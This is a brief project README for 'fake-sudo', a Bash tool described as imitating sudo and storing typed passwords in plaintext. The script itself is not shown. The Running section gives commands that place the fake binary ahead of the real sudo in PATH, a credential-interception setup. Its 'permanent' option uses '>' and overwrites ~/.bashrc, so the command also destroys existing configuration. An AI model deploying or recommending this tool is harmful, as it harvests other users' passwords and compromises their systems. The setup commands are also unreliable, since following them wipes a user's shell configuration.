# fake-sudo
Bash script that imitates sudo and stores plaintext passwords in a file.

## Requirements

* Linux OS.

## How it works

...

## Running

  In order to make the program work in the appropriate way you need to add the directory it is in to the PATH environment variable. This can be done by running export *PATH=/path/to/fake/sudo:$PATH* or running *echo PATH="/path/to/fake/sudo:$PATH" > ~/.bashrc && source ~/.bashrc*. Note that the second option is a permanent one.
